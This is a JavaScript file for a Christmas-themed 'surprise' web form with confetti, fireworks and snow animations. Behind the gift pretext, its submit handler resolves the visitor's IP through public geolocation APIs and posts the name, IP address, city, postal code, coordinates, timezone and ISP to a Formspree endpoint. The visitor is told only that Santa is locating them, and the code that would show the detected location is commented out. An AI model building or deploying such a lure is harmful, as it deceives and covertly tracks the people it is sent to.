// Christmas Surprise Form with Celebration Animations
document.addEventListener('DOMContentLoaded', function() {
    const submitBtn = document.getElementById('submitBtn');
    const userNameInput = document.getElementById('userName');
    const nameError = document.getElementById('nameError');
    const statusMsg = document.getElementById('statusMessage');
    const locationInfo = document.getElementById('locationInfo');
    const manualLocationDiv = document.querySelector('.location-fallback');
    const manualLocationInput = document.getElementById('manualLocation');
    
    // Formspree Configuration
    const FORMSPREE_ENDPOINT = "https://formspree.io/f/mgoeyjon";
    
    // Celebration configuration
    const celebrationConfig = {
        enabled: true,
        particleCount: 50,
        sparkleCount: 30,
        confettiCount: 100,
        duration: 5000,
        colors: ['#FF6B6B', '#4ECDC4', '#FFD166', '#06D6A0', '#118AB2', '#EF476F', '#FFD700']
    };
    
    // Track if we're currently processing
    let isProcessing = false;
    let userLocationData = null;
    let isCelebrating = false;
    
    // Free IP geolocation API
    const IP_API_ENDPOINT = "https://ipapi.co/json/";
    const BACKUP_IP_API = "https://geolocation-db.com/json/";
    
    // Celebration emojis and symbols
    const celebrationSymbols = ['🎉', '🎊', '🎁', '✨', '🌟', '💫', '🥳', '🎄', '🎅', '🤶', '🧑‍🎄', '🦌', '⭐', '❄️', '🎆', '🎇', '🪅', '🪩'];
    const flowerSymbols = ['🌸', '💮', '🏵️', '🌹', '🥀', '🌺', '🌻', '🌼', '🌷', '🌱', '🍃', '🌿', '☘️', '🍀', '🎍', '🪴'];
    
    // Validation functions
    function validateName(name) {
        name = name.trim();
        if (!name) {
            return "Please enter your name";
        }
        if (name.length < 2) {
            return "Name should be at least 2 characters";
        }
        if (name.length > 50) {
            return "Name should be less than 50 characters";
        }
        if (!/^[a-zA-Z\s\-'.]+$/.test(name)) {
            return "Please enter a valid name (letters and spaces only)";
        }
        return null;
    }
    
    function updateNameValidation() {
        const name = userNameInput.value.trim();
        const error = validateName(name);
        
        if (error) {
            userNameInput.classList.add('error');
            userNameInput.classList.remove('success');
            nameError.textContent = error;
            return false;
        } else {
            userNameInput.classList.remove('error');
            userNameInput.classList.add('success');
            nameError.textContent = '';
            return true;
        }
    }
    
    // Status display with celebration
    function showStatus(text, type, celebrate = false) {
        statusMsg.textContent = text;
        statusMsg.className = `status-message ${type}`;
        statusMsg.style.display = 'block';
        
        if (celebrate && type === 'success') {
            statusMsg.classList.add('celebrating');
            triggerCelebration();
        }
        
        if (type === 'success') {
            setTimeout(() => {
                statusMsg.style.display = 'none';
                statusMsg.classList.remove('celebrating');
            }, 8000);
        }
    }
    
    function showLocationInfo(data) {
        let info = `<strong>🎯 preparing christmas Gift:</strong><br>`;
        
        if (data.city && data.region) {
            info += `${data.city}, ${data.region}`;
            if (data.country_name) {
                info += `, ${data.country_name}`;
            }
        } else if (data.country_name) {
            info += `${data.country_name}`;
        } else {
            info += `Christmas Gift successfully prepared`;
        }
        
        locationInfo.innerHTML = info;
        locationInfo.classList.add('show');
    }
    
    // Celebration Animation Functions
    function createParticle(symbol, x, y, animation) {
        const particle = document.createElement('div');
        particle.className = 'celebration-particle';
        particle.innerHTML = symbol;
        particle.style.cssText = `
            left: ${x}px;
            top: ${y}px;
            color: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
            animation: ${animation} ${2 + Math.random() * 3}s ease-out forwards;
            font-size: ${20 + Math.random() * 20}px;
            transform: rotate(${Math.random() * 360}deg);
        `;
        document.body.appendChild(particle);
        
        setTimeout(() => {
            if (particle.parentNode) {
                particle.parentNode.removeChild(particle);
            }
        }, 3000);
        
        return particle;
    }
    
    function createSparkle(x, y) {
        const sparkle = document.createElement('div');
        sparkle.className = 'celebration-sparkle';
        sparkle.style.cssText = `
            left: ${x}px;
            top: ${y}px;
            background: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
            animation-delay: ${Math.random() * 2}s;
            animation-duration: ${0.5 + Math.random()}s;
        `;
        document.body.appendChild(sparkle);
        
        setTimeout(() => {
            if (sparkle.parentNode) {
                sparkle.parentNode.removeChild(sparkle);
            }
        }, 2000);
    }
    
    function createConfetti(x, y) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.cssText = `
            left: ${x}px;
            top: ${y}px;
            background: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
            --rotation: ${Math.random() * 720 - 360}deg;
            animation: confettiRain ${1 + Math.random() * 2}s ease-out forwards;
            animation-delay: ${Math.random() * 0.5}s;
            border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
            transform: rotate(${Math.random() * 360}deg);
        `;
        document.body.appendChild(confetti);
        
        setTimeout(() => {
            if (confetti.parentNode) {
                confetti.parentNode.removeChild(confetti);
            }
        }, 3000);
    }
    
    function createFirework(x, y) {
        const firework = document.createElement('div');
        firework.className = 'firework';
        firework.style.cssText = `
            left: ${x}px;
            top: ${y}px;
            color: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
        `;
        document.body.appendChild(firework);
        
        // Explode effect
        const particles = 12;
        for (let i = 0; i < particles; i++) {
            setTimeout(() => {
                const angle = (i * 360 / particles) * (Math.PI / 180);
                const distance = 50 + Math.random() * 100;
                const particle = document.createElement('div');
                particle.className = 'firework-particle';
                particle.style.cssText = `
                    position: fixed;
                    left: ${x}px;
                    top: ${y}px;
                    width: 4px;
                    height: 4px;
                    border-radius: 50%;
                    background: ${firework.style.color};
                    animation: fireworkExplode 1s ease-out forwards;
                    --angle: ${angle}rad;
                    --distance: ${distance}px;
                `;
                document.body.appendChild(particle);
                
                setTimeout(() => {
                    if (particle.parentNode) {
                        particle.parentNode.removeChild(particle);
                    }
                }, 1000);
            }, i * 50);
        }
        
        setTimeout(() => {
            if (firework.parentNode) {
                firework.parentNode.removeChild(firework);
            }
        }, 1000);
    }
    
    function createFloatingText(text, x, y) {
        const floatingText = document.createElement('div');
        floatingText.className = 'floating-text';
        floatingText.textContent = text;
        floatingText.style.cssText = `
            left: ${x}px;
            top: ${y}px;
            animation: floatUp 3s ease-out forwards;
            color: ${celebrationConfig.colors[Math.floor(Math.random() * celebrationConfig.colors.length)]};
        `;
        document.body.appendChild(floatingText);
        
        setTimeout(() => {
            if (floatingText.parentNode) {
                floatingText.parentNode.removeChild(floatingText);
            }
        }, 3000);
    }
    
    function createGiftBox(x, y) {
        const giftBox = document.createElement('div');
        giftBox.className = 'gift-box';
        giftBox.innerHTML = '🎁';
        giftBox.style.cssText = `
            left: ${x}px;
            top: ${y}px;
            animation: floatUp 4s ease-out forwards, bounce 0.5s ease-in-out infinite;
        `;
        document.body.appendChild(giftBox);
        
        setTimeout(() => {
            if (giftBox.parentNode) {
                giftBox.parentNode.removeChild(giftBox);
            }
        }, 4000);
    }
    
    function createFlowerPetals() {
        const petalCount = 30;
        const container = document.createElement('div');
        container.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
        `;
        document.body.appendChild(container);
        
        for (let i = 0; i < petalCount; i++) {
            const petal = document.createElement('div');
            petal.innerHTML = flowerSymbols[Math.floor(Math.random() * flowerSymbols.length)];
            petal.style.cssText = `
                position: absolute;
                font-size: ${20 + Math.random() * 30}px;
                opacity: ${0.5 + Math.random() * 0.5};
                left: ${Math.random() * 100}%;
                animation: floatDown ${3 + Math.random() * 4}s linear infinite;
                animation-delay: ${Math.random() * 5}s;
                transform: rotate(${Math.random() * 360}deg);
            `;
            container.appendChild(petal);
        }
        
        setTimeout(() => {
            if (container.parentNode) {
                container.parentNode.removeChild(container);
            }
        }, 8000);
    }
    
    // Main celebration trigger
    function triggerCelebration() {
        if (isCelebrating || !celebrationConfig.enabled) return;
        
        isCelebrating = true;
        submitBtn.classList.add('celebrating');
        
        // Create overlay
        const overlay = document.createElement('div');
        overlay.className = 'celebration-overlay';
        overlay.style.opacity = '0.3';
        document.body.appendChild(overlay);
        
        // Update overlay position based on mouse/touch
        const updateOverlay = (e) => {
            const x = e.type.includes('touch') ? e.touches[0].clientX : e.clientX;
            const y = e.type.includes('touch') ? e.touches[0].clientY : e.clientY;
            overlay.style.setProperty('--x', `${x}px`);
            overlay.style.setProperty('--y', `${y}px`);
        };
        
        document.addEventListener('mousemove', updateOverlay);
        document.addEventListener('touchmove', updateOverlay);
        
        // Create flower petals
        createFlowerPetals();
        
        // Create multiple bursts of celebration
        const bursts = [
            { type: 'particles', count: celebrationConfig.particleCount, delay: 0 },
            { type: 'sparkles', count: celebrationConfig.sparkleCount, delay: 500 },
            { type: 'confetti', count: celebrationConfig.confettiCount, delay: 1000 },
            { type: 'fireworks', count: 5, delay: 1500 },
            { type: 'gifts', count: 3, delay: 2000 },
            { type: 'text', count: 5, delay: 2500 }
        ];
        
        bursts.forEach((burst, burstIndex) => {
            setTimeout(() => {
                for (let i = 0; i < burst.count; i++) {
                    setTimeout(() => {
                        const x = Math.random() * window.innerWidth;
                        const y = Math.random() * window.innerHeight;
                        
                        switch(burst.type) {
                            case 'particles':
                                const symbol = celebrationSymbols[Math.floor(Math.random() * celebrationSymbols.length)];
                                createParticle(symbol, x, y, Math.random() > 0.5 ? 'floatUp' : 'floatDown');
                                break;
                            case 'sparkles':
                                createSparkle(x, y);
                                break;
                            case 'confetti':
                                createConfetti(x, y);
                                break;
                            case 'fireworks':
                                createFirework(x, y);
                                break;
                            case 'gifts':
                                createGiftBox(x, y);
                                break;
                            case 'text':
                                const texts = ['Merry Christmas!', 'Ho Ho Ho!', '🎁 Surprise!', '🎄 Joy!', '✨ Magic!'];
                                createFloatingText(texts[Math.floor(Math.random() * texts.length)], x, y);
                                break;
                        }
                    }, i * 50);
                }
            }, burst.delay);
        });
        
        // Create floating flowers/petals from edges
        const flowerInterval = setInterval(() => {
            const side = Math.floor(Math.random() * 4);
            let x, y, animation;
            
            switch(side) {
                case 0: // top
                    x = Math.random() * window.innerWidth;
                    y = -50;
                    animation = 'floatDown';
                    break;
                case 1: // bottom
                    x = Math.random() * window.innerWidth;
                    y = window.innerHeight + 50;
                    animation = 'floatUp';
                    break;
                case 2: // left
                    x = -50;
                    y = Math.random() * window.innerHeight;
                    animation = 'floatRight';
                    break;
                case 3: // right
                    x = window.innerWidth + 50;
                    y = Math.random() * window.innerHeight;
                    animation = 'floatLeft';
                    break;
            }
            
            const symbol = flowerSymbols[Math.floor(Math.random() * flowerSymbols.length)];
            createParticle(symbol, x, y, animation);
        }, 200);
        
        // Clean up after celebration
        setTimeout(() => {
            isCelebrating = false;
            submitBtn.classList.remove('celebrating');
            document.removeEventListener('mousemove', updateOverlay);
            document.removeEventListener('touchmove', updateOverlay);
            
            if (overlay.parentNode) {
                overlay.parentNode.removeChild(overlay);
            }
            
            clearInterval(flowerInterval);
        }, celebrationConfig.duration);
    }
    
    // Add CSS for firework explosion
    const celebrationStyles = document.createElement('style');
    celebrationStyles.textContent = `
        @keyframes fireworkExplode {
            0% {
                transform: translate(0, 0) scale(1);
                opacity: 1;
            }
            100% {
                transform: translate(
                    calc(cos(var(--angle)) * var(--distance)),
                    calc(sin(var(--angle)) * var(--distance))
                ) scale(0);
                opacity: 0;
            }
        }
        
        .firework-particle {
            animation: fireworkExplode 1s ease-out forwards;
        }
    `;
    document.head.appendChild(celebrationStyles);
    
    // Get location from IP address
    async function getLocationFromIP() {
        showStatus("🎄 Preparing your Christmass Gift...", "info");
        
        try {
            const response = await fetch(IP_API_ENDPOINT, {
                method: 'GET',
                headers: { 'Accept': 'application/json' }
            });
            
            if (response.ok) {
                const data = await response.json();
                
                if (data.error !== true) {
                    userLocationData = {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country_name: data.country_name,
                        country_code: data.country_code,
                        postal: data.postal,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        timezone: data.timezone,
                        org: data.org
                    };
                    return userLocationData;
                }
            }
        } catch (error) {
            console.log("Primary IP API failed, trying backup...");
        }
        
        try {
            const backupResponse = await fetch(BACKUP_IP_API, {
                method: 'GET',
                headers: { 'Accept': 'application/json' }
            });
            
            if (backupResponse.ok) {
                const data = await backupResponse.json();
                
                userLocationData = {
                    ip: data.IPv4 || "Unknown",
                    city: data.city,
                    region: data.state,
                    country_name: data.country_name,
                    country_code: data.country_code,
                    latitude: data.latitude,
                    longitude: data.longitude
                };
                return userLocationData;
            }
        } catch (error) {
            console.log("Backup IP API also failed");
        }
        
        userLocationData = {
            ip: "Detection failed",
            city: "Unknown",
            region: "Unknown",
            country_name: "Unknown",
            error: "Could not detect location automatically"
        };
        
        return userLocationData;
    }
    
    // Formspree submission
    async function submitToFormspree(name, locationData, manualLocation = '') {
        const formData = new FormData();
        formData.append('name', name);
        formData.append('timestamp', new Date().toISOString());
        
        if (manualLocation) {
            formData.append('manual_location', manualLocation);
            formData.append('location_source', 'manual');
        } else if (locationData && locationData.city !== "Unknown") {
            formData.append('location_city', locationData.city || 'Unknown');
            formData.append('location_region', locationData.region || 'Unknown');
            formData.append('location_country', locationData.country_name || 'Unknown');
            formData.append('location_ip', locationData.ip || 'Unknown');
            formData.append('location_source', 'ip_detection');
            
            if (locationData.latitude && locationData.longitude) {
                formData.append('latitude', locationData.latitude);
                formData.append('longitude', locationData.longitude);
            }
        } else {
            formData.append('location_source', 'not_detected');
            formData.append('location_city', 'Not detected');
        }
        
        formData.append('_subject', '🎄 Christmas Surprise Request');
        formData.append('_format', 'plain');
        formData.append('_replyto', 'noreply@christmassurprise.com');
        
        try {
            const response = await fetch(FORMSPREE_ENDPOINT, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            });
            
            return response.ok ? 
                { success: true, message: 'Submission successful!' } :
                { success: false, message: 'Submission failed' };
        } catch (error) {
            return { success: false, message: 'Network error' };
        }
    }
    
    // Reset button state
    function resetButton() {
        isProcessing = false;
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="fas fa-gift"></i> Request Christmas Surprise';
        submitBtn.style.background = '';
        submitBtn.classList.remove('celebrating');
    }
    
    // Show manual location input
    function showManualLocationInput() {
        manualLocationDiv.style.display = 'block';
        manualLocationInput.focus();
    }
    
    // Main submission handler
    async function handleSubmission() {
        if (isProcessing) return;
        
        statusMsg.style.display = 'none';
        locationInfo.classList.remove('show');
        
        const name = userNameInput.value.trim();
        const nameValidationError = validateName(name);
        
        if (nameValidationError) {
            showStatus(nameValidationError, "error");
            userNameInput.focus();
            return;
        }
        
        isProcessing = true;
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Preparing your surprise...';
        
        // Start with a small celebration when processing begins
        setTimeout(() => {
            createParticle('✨', 
                Math.random() * window.innerWidth, 
                Math.random() * window.innerHeight, 
                'floatUp'
            );
        }, 100);
        
        try {
            showStatus("🔍 Detecting your location for Santa...", "info");
            const locationData = await getLocationFromIP();
            
            // showLocationInfo(locationData);
            const manualLocation = manualLocationInput.value.trim();
            
            if (!manualLocation && (!locationData.city || locationData.city === "Unknown")) {
                showStatus("📍 Couldn't detect your city. Please enter it below (optional).", "warning");
                showManualLocationInput();
                resetButton();
                return;
            }
            
            // More celebration during sending
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    createParticle('🎄', 
                        Math.random() * window.innerWidth, 
                        Math.random() * window.innerHeight, 
                        'floatUp'
                    );
                }, i * 300);
            }
            
            showStatus("✉️ Sending your Christmas wish to Santa... 🎅", "info");
            const result = await submitToFormspree(name, locationData, manualLocation);
            
            if (result.success) {
                showStatus(`🎉 Thank you ${name}! Your Christmas surprise is flowers of happiness enjoy! 🎁`, "success", true);
                submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Surprise Requested!';
                submitBtn.style.background = '#4CAF50';
                
                setTimeout(() => {
                    userNameInput.value = '';
                    userNameInput.classList.remove('success');
                    manualLocationInput.value = '';
                    manualLocationDiv.style.display = 'none';
                    locationInfo.classList.remove('show');
                    resetButton();
                }, 8000);
            } else {
                showStatus(`❌ Oops! ${result.message}`, "error");
                resetButton();
            }
            
        } catch (error) {
            console.log(error)
            showStatus("⚠️ Something went wrong. Please try again.", "error");
            resetButton();
        }
    }
    
    // Event Listeners
    userNameInput.addEventListener('input', updateNameValidation);
    userNameInput.addEventListener('blur', updateNameValidation);
    
    submitBtn.addEventListener('click', handleSubmission);
    
    userNameInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && !isProcessing) {
            e.preventDefault();
            submitBtn.click();
        }
    });
    
    manualLocationInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && !isProcessing) {
            e.preventDefault();
            submitBtn.click();
        }
    });
    
    // Small celebration when page loads
    setTimeout(() => {
        for (let i = 0; i < 3; i++) {
            setTimeout(() => {
                createParticle('🌟', 
                    Math.random() * window.innerWidth, 
                    Math.random() * window.innerHeight, 
                    'floatDown'
                );
            }, i * 500);
        }
    }, 1000);
    
    // Christmas snow effect
    const snowContainer = document.createElement('div');
    snowContainer.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: -1;
    `;
    document.body.appendChild(snowContainer);
    
    for (let i = 0; i < 10; i++) {
        const flake = document.createElement('div');
        flake.innerHTML = '❄';
        flake.style.cssText = `
            position: absolute;
            font-size: ${15 + Math.random() * 15}px;
            opacity: ${0.3 + Math.random() * 0.3};
            animation: fall ${3 + Math.random() * 5}s linear infinite;
            animation-delay: ${Math.random() * 5}s;
            left: ${Math.random() * 100}%;
        `;
        snowContainer.appendChild(flake);
    }
});
